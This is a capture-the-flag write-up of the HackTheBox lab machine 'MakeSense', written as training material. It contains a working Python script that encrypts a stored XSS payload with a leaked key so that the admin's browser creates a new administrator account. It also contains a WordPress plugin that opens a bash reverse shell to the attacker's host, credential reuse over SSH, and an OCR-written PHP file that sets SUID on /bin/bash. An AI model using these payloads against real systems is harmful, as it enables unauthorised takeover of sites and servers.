# MakeSense – HackTheBox Writeup

**Target:** MakeSense (10.129.39.223)
**Attacker:** Kali Linux
**OS:** Linux (Ubuntu)
**Difficulty:** Medium
**Attack Path:** WordPress Enumeration → Encryption Key Leak → Stored XSS → Admin Account Creation → Reverse Shell → DB Password Reuse → OCR Service PHP File Write → SUID Bash → Root

---

## Recon

### Port Scan

```bash
nmap -sV -p- --min-rate 5000 10.129.39.223
```

Four ports found but only two fully accessible. SSH on 22, HTTP on 80 (filtered), HTTPS on 443 running Apache 2.4.58, and port 8001 (filtered). The filtered ports mean something is listening but a firewall is silently dropping our packets. Different from closed where you get a RST back. That immediately hints that 80 and 8001 are internal services we'll need to reach later.

### Finding the Hostname

```bash
openssl s_client -connect 10.129.39.223:443 </dev/null 2>/dev/null | openssl x509 -noout -text | grep -iA1 "subject\|dns"
```

Got `CN=makesense.htb`. No wildcard this time, just the one hostname. Added it to hosts:

```bash
echo "10.129.39.223 makesense.htb" | sudo tee -a /etc/hosts
```

### Subdomain Fuzzing

Even without a wildcard in the cert, always worth checking. Grabbed the default response size first:

```bash
curl -k -s https://10.129.39.223 -H "Host: doesnotexist.makesense.htb" | wc -c
# 34965
```

```bash
ffuf -u https://10.129.39.223 -H "Host: FUZZ.makesense.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -k -fs 34965
```

Only found `www` which is just a redirect. No hidden subdomains on this one.

### Identifying the Stack

```bash
curl -kI https://makesense.htb/
```

The response headers told us `Server: Apache/2.4.58 (Ubuntu)` and the `Link` header pointed to `index.php?rest_route=/` which is WordPress REST API. Pulled the page source and confirmed:

```html
<meta name="generator" content="WordPress 7.0" />
```

WordPress 7.0 on Apache with PHP. The HTML source also had a custom theme called `webagency` and a very interesting JavaScript file: `whisper-wrapper.js` for browser-based voice transcription. There was also a contact form and a "Call" modal with audio recording functionality.

### WordPress Enumeration

```bash
wpscan --url https://makesense.htb --disable-tls-checks --enumerate p,t,u
```

WPScan found three users: `walter`, `admin`, and `jake`. XML-RPC was enabled, upload directory had listing enabled, and the custom `webagency` theme was version 1.0. No plugins detected through passive scanning.

The REST API also confirmed the users:

```bash
curl -ks https://makesense.htb/index.php?rest_route=/wp/v2/users | jq
```

The `admin` user's URL field showed `http://localhost:8000` which is yet another internal port.

---

## Breaking In – The XSS Chain

### Finding the Encryption Key

The site's "Call" feature uses Whisper (OpenAI's speech-to-text) running in the browser via Transformers.js. Pulled the JavaScript:

```bash
curl -ks https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js
```

Right at the top, in plain text:

```javascript
const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';
```

The comment even says "must match server-side". This is the AES-GCM key used to encrypt transcription data before sending it to the backend. Having this means we can craft our own encrypted payloads.

Even better, the `applySymbolMapping` function had a comment that literally said "Map spoken words to their symbol equivalents for XSS injection". The function converts spoken words like "open bracket" to `<` and "close bracket" to `>`. That's a clear hint about the intended attack vector.

### Understanding the Flow

Reading `main.js` revealed the complete data flow:

1. User submits contact form → server returns a `post_id`
2. If message is over 20 characters, the browser summarizes it client-side
3. Browser encrypts `{transcription, summary}` with the AES-GCM key
4. Encrypted payload sent to `save_voice_results` AJAX action with the `post_id`
5. Server decrypts and stores the content

The server trusts the encrypted payload blindly. Since we have the key, we can encrypt whatever we want, including XSS payloads.

### Testing the Contact Form

```bash
curl -ks -X POST https://makesense.htb/wp-admin/admin-ajax.php \
  -d "action=submit_contact_form&nonce=f811fdb250&name=test&email=test@test.com&phone=1234&message=This is a test message for the contact form"
```

```json
{"success":true,"data":{"message":"Thank you for contacting us!","post_id":69}}
```

The nonce was in the HTML source inside the `webagency_ajax` JavaScript object. Got a `post_id` back. Now we just need to send a malicious encrypted payload tied to that post.

### The XSS Exploit

First attempt was a cookie stealer but WordPress sets `HttpOnly` on session cookies so JavaScript can't read them. Instead, the XSS creates a new admin account by making the admin's browser call the user creation endpoint with its own session:

```python
import hashlib, json, os, base64, requests, re, sys
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

TARGET = "https://makesense.htb"
ENCRYPTION_KEY = "bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI"

# Get nonce from homepage
r = requests.get(TARGET, verify=False)
nonce = re.search(r'"nonce":"([a-f0-9]+)"', r.text).group(1)

# Submit contact form to get post_id
r = requests.post(f"{TARGET}/wp-admin/admin-ajax.php", data={
    "action": "submit_contact_form",
    "nonce": nonce,
    "name": "Test User",
    "email": "test@test.com",
    "phone": "1234567890",
    "message": "Please call me back regarding your services"
}, verify=False)
post_id = r.json()["data"]["post_id"]

# XSS payload that creates a new admin user
xss = '''<script>
fetch("/wp-admin/user-new.php").then(r=>r.text()).then(h=>{
  let n=h.match(/name="_wpnonce_create-user" value="([^"]+)"/)[1];
  let f=new FormData();
  f.append("_wpnonce_create-user",n);
  f.append("action","createuser");
  f.append("user_login","hacker");
  f.append("email","hacker@hacker.com");
  f.append("pass1","Hacked123!");
  f.append("pass2","Hacked123!");
  f.append("role","administrator");
  fetch("/wp-admin/user-new.php",{method:"POST",body:f});
});
</script>'''

payload = json.dumps({"transcription": xss, "summary": xss})

# Encrypt with AES-GCM matching the JS implementation
key_material = hashlib.sha256(ENCRYPTION_KEY.encode()).digest()
aesgcm = AESGCM(key_material)
iv = os.urandom(12)
ciphertext = aesgcm.encrypt(iv, payload.encode(), None)
combined = iv + ciphertext
encrypted_b64 = base64.b64encode(combined).decode()

# Send encrypted payload
r = requests.post(f"{TARGET}/wp-admin/admin-ajax.php", data={
    "action": "save_voice_results",
    "nonce": nonce,
    "post_id": post_id,
    "encrypted_payload": encrypted_b64
}, verify=False)
```

The exploit works because the server decrypts our payload, stores the raw HTML/JavaScript in the database, and when the admin bot views the contact submission, the XSS fires. The bot's browser has a valid admin session, so the JavaScript creates a new admin account using the admin's own CSRF tokens.

### Getting WordPress Admin

After running the script and waiting for the bot to trigger the XSS:

```bash
# Get test cookie first
curl -ks -c cookies.txt https://makesense.htb/wp-login.php > /dev/null
# Login
curl -ks -c cookies.txt -b cookies.txt \
  -X POST https://makesense.htb/wp-login.php \
  -d 'log=hacker&pwd=Hacked123!&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1' \
  -L | head -30
```

Got the "Confirm your administration email" page which only appears when you're successfully logged in. Full WordPress admin access.

---

## Getting a Shell

### Plugin Upload

The Theme File Editor blocked editing `404.php` ("Sorry, that file cannot be edited"). Went the plugin upload route instead:

```bash
mkdir -p /tmp/revshell
cat > /tmp/revshell/revshell.php << 'EOF'
<?php
/*
Plugin Name: Rev Shell
Description: Reverse shell
Version: 1.0
*/
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.15.142/4444 0>&1'");
EOF
cd /tmp && zip -r revshell.zip revshell/
```

Uploaded through WordPress:

```bash
NONCE=$(curl -ks -b ~/cookies.txt https://makesense.htb/wp-admin/plugin-install.php | grep -oP 'name="_wpnonce" value="\K[^"]+')
curl -ks -b ~/cookies.txt -X POST 'https://makesense.htb/wp-admin/update.php?action=upload-plugin' \
  -F "pluginzip=@/tmp/revshell.zip" \
  -F "_wpnonce=$NONCE" -L
```

Plugin installed successfully. The response included an activation link with its own nonce. Activated it:

```bash
curl -ks -b ~/cookies.txt -L 'https://makesense.htb/wp-admin/plugins.php?action=activate&plugin=revshell%2Frevshell.php&_wpnonce=a8015cc3b7'
```

Shell popped on the listener as `www-data`.

---

## User Access

### Database Credentials

Standard WordPress credential grab:

```bash
cat /var/www/html/wp-config.php | grep -iE "DB_|pass|secret|key"
```

```
define( 'DB_USER', 'walter' );
define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
```

Interesting: it was using SQLite (`DB_DIR` and `DB_FILE` pointing to `.ht.sqlite`) not MySQL.

### SSH as Walter

Password reuse worked:

```bash
ssh walter@makesense.htb
# Password: JbhHDAEgXvri3!
```

User flag grabbed from `/home/walter/user.txt`.

---

## Privilege Escalation

### Enumeration

```bash
sudo -l
# Sorry, user walter may not run sudo on makesense.
id
# uid=1000(walter) gid=1000(walter) groups=1000(walter)
```

No sudo, no interesting groups. Checked internal services:

```bash
ss -tlnp
```

Port 8001 was listening on 127.0.0.1. Checked processes:

```bash
ps aux | grep -E "8001|node|python|admin"
```

Found it: `root 1431 php -S 127.0.0.1:8001 -t /root/ocr4/`. A PHP development server running **as root** from `/root/ocr4/`. That's the target.

There was also `prey-unified.py` running as user `admin` with Chrome — that's the bot that triggers the XSS.

### The OCR Service

Tested walter's credentials:

```bash
curl -v http://127.0.0.1:8001/ -u "walter:JbhHDAEgXvri3!"
```

Got in. It's an OCR application called "MakeSense" that lets you draw text on a canvas, runs Tesseract to recognize it, and saves the recognized text to a file. The critical detail: it runs as root and you control the filename.

### Exploiting the OCR

The plan: make Tesseract recognize PHP code from an image, then save it as a `.php` file. Since the PHP development server serves from the same directory, we can execute it.

Created an image with a PHP payload on Kali using ImageMagick:

```bash
convert -size 800x100 xc:white -font Courier -pointsize 36 -fill black \
  -annotate +10+60 '<?php chmod("/bin/bash",04755); ?>' /tmp/payload.png
```

Courier font at a large size is important. Tesseract reads monospace fonts much more reliably than handwriting. Transferred it to the box:

```bash
scp /tmp/payload.png walter@makesense.htb:/tmp/payload.png
```

Sent the image to the OCR service, got back the recognized text and a session-bound `ocr_id`, then saved it as a PHP file:

```bash
B64=$(base64 -w0 /tmp/payload.png)
RESPONSE=$(curl -s -c /tmp/ocr_cookies.txt http://127.0.0.1:8001/ -u "walter:JbhHDAEgXvri3!" \
  --data-urlencode "canvas_image=data:image/png;base64,${B64}")
OCR_ID=$(echo "$RESPONSE" | grep -oP 'name="ocr_id" value="\K[^"]+')
curl -s -b /tmp/ocr_cookies.txt http://127.0.0.1:8001/ -u "walter:JbhHDAEgXvri3!" \
  -d "ocr_id=${OCR_ID}&filename=suid.php&save_output="
```

The response confirmed `Saved as: saved/suid.php`. Triggered it:

```bash
curl -s 'http://127.0.0.1:8001/saved/suid.php' -u 'walter:JbhHDAEgXvri3!'
```

The PHP code ran as root and set the SUID bit on `/bin/bash`:

```bash
/bin/bash -p
whoami
# root
cat /root/root.txt
```

Box pwned.

---

## Attack Chain Summary

```
nmap -p- → Port 443 (Apache/HTTPS), 80 and 8001 filtered
→ SSL cert → makesense.htb
→ WordPress 7.0 identified from meta generator tag
→ WPScan → Users: walter, admin, jake
→ whisper-wrapper.js → Hardcoded AES-GCM encryption key leaked
→ main.js → Understood encrypted payload submission flow
→ Contact form → Got post_id
→ Crafted encrypted XSS payload → Admin bot triggered it
→ XSS created new WordPress admin account (hacker:Hacked123!)
→ Plugin upload → Reverse shell as www-data
→ wp-config.php → DB password for walter: JbhHDAEgXvri3!
→ SSH as walter → User flag
→ Port 8001 → OCR service running as root
→ ImageMagick → Created image with PHP payload
→ Tesseract recognized PHP code → Saved as suid.php
→ Triggered suid.php → chmod u+s /bin/bash
→ /bin/bash -p → Root
```

---

## What I Learned

Hardcoded encryption keys in JavaScript are free loot. The AES-GCM key was sitting right there in `whisper-wrapper.js` with a comment saying it must match the server side. Client-side encryption with a key the client can read is not encryption at all. Always check every JS file loaded by the page.

When cookies are HttpOnly, XSS can't steal them but it can still act as the user. Instead of exfiltrating cookies, have the victim's browser make requests on your behalf. Creating an admin account through the XSS is cleaner than cookie theft because you get persistent access even if the session expires.

The contact form nonce was embedded in the page source inside a JavaScript variable (`webagency_ajax`). WordPress nonces aren't secrets, they're CSRF tokens. Anyone can grab them from the page HTML.

WordPress plugin upload is the most reliable way to get code execution when you have admin. The Theme Editor blocked direct file edits but plugin upload worked fine. Always try both paths.

Password reuse between database configs and SSH is still extremely common. The SQLite password for `walter` worked for SSH on the first try. Always try every credential you find against every service.

PHP development server (`php -S`) running as root is a critical misconfiguration. It serves and executes PHP files from its document root. If you can write a `.php` file into that directory, you have code execution as root.

Tesseract OCR reads monospace fonts reliably. When you need OCR to recognize specific text like PHP code, use Courier font at a large point size with high contrast (black on white). The more readable the image, the more accurate the recognition.

The session-based OCR flow required two requests with the same session cookie. First request sends the image and gets an `ocr_id`. Second request uses that `ocr_id` to save the result. Without the cookie, the server doesn't know which OCR result you're referring to. Always use `-c` and `-b` with curl when dealing with session-based applications.

Filtered ports in nmap mean something is there. Ports 80 and 8001 were filtered from outside but listening internally. Always check `ss -tlnp` after getting a shell to find internal services that weren't visible during initial recon.

*Educational purposes only. This is a HackTheBox machine in a controlled lab environment.*
